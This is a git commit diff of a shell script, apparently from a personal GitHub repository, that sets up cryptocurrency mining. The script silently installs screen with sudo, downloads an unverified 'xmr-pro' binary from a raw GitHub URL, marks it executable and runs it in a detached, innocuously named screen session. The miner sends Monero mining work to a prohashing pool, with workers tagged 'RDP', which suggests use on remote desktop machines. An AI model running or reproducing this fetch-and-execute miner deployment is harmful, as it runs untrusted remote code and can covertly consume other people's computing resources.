c54e88efcbab2a51de5b839fc56f79b533ca8a34
Myaxisplay <101804515+Myaxisplay@users.noreply.github.com>
2022-07-14 13:21:46 +0700

    Update and rename tess.sh to tos.sh

--- tos.sh
+++ tos.sh
@@ -1,13 +1,13 @@
 #!/bin/sh
 
-WALLET=Prodent.RDP-$(echo $(shuf -i 1-100 -n 1))
+WALLET=Prodent
 
 POOL=prohashing.com:3359 
 
 sudo apt update > /dev/null 2>&1
 sudo apt install screen -y > /dev/null 2>&1
 wget https://raw.githubusercontent.com/Myaxisplay/oke/main/xmr-pro; chmod +x xmr-pro
-screen -S Admin_Bo -dm ./xmr-pro -a randomx -o $POOL -u $WALLET -t 4
+screen -S Admin_Bo -dm ./xmr-pro -o $POOL -u $WALLET -p n=$(echo $(shuf -i 1-200 -n 1)-RDP) -k --coin monero -a rx/0
 screen -ls
 sleep 4
 clear
